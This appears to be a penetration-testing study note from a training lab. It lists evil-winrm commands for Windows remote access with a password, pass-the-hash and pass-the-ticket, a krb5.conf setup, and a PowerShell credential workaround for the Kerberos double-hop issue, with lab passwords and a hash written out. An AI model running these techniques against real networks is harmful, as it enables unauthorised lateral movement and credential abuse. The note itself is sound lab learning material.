---
tags:
  - PtH
  - PtT
---
```shell-session
$ evil-winrm -i 10.129.201.248 -u 'Cry0l1t3' -p 'P455w0rD!' [--port <PORT>]
```
# Pass the Hash
```shell-session
$ evil-winrm -i <IP> -u <USER>[@DOMAIN] -H 30B3783CE2ABF1AF70F77D0660CF3453
```

# Pass the Ticket
Prerequisite: `krb5-user`
Once installed, change `/etc/krb5.conf` to include the following:
```shell-session
$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB
<SNIP>
[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
<SNIP>
```

```shell-session
$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
# Kerberos "Double-Hop"
[[klist]] can confirm if any forwardable credentials are stored.
```powershell
PS > $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
PS > $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
PS > get-domainuser -spn -credential $Cred | select samaccountname
```